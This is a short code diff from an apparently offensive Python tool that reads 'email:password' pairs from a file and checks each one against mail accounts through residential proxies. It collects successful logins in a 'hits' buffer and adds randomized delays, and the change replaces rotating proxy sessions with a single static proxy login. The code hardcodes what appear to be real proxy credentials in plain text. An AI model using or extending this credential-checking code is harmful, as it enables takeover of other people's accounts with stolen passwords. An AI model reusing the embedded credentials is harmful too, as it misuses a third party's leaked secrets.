@@ -863,13 +863,10 @@ def process_file_and_scan(file_path, keyword=""):
     target_senders_list = get_target_senders_from_db()
     
     def scan_cred_worker(cred):
-        import string
         email, pwd = cred.split(':', 1)
-        sess_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
-        proxy_url = f"http://iFWCvoL1YiGW0U1T-session-{sess_id}:gAPHeqlqy33PlWrj@geo.iproyal.com:12321"
         iproyal_auth = {
-            "http": proxy_url,
-            "https": proxy_url
+            "http": "http://iFWCvoL1YiGW0U1T:gAPHeqlqy33PlWrj@geo.iproyal.com:12321",
+            "https": "http://iFWCvoL1YiGW0U1T:gAPHeqlqy33PlWrj@geo.iproyal.com:12321"
         }
         run_local_audit(email.strip(), pwd.strip(), iproyal_auth, hits_buffer, keyword, user_targets_dict=target_senders_list)
         time.sleep(random.uniform(0.5, 1.2))
